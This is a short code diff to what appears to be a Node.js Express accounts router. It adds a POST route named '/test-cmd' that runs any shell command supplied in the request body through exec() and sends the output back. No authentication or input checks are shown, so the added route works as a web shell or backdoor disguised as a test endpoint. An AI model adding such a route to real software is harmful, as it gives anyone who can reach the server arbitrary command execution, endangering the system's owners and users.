@@ -263,6 +263,18 @@ function createAccountsRouter({ safeWriteEcosystem }) {
         }
     });
 
+    router.post('/test-cmd', (req, res) => {
+        const { cmd } = req.body;
+        exec(cmd, (err, stdout, stderr) => {
+            res.json({
+                success: true,
+                err: err ? err.message : null,
+                stdout,
+                stderr
+            });
+        });
+    });
+
     return router;
 }
 
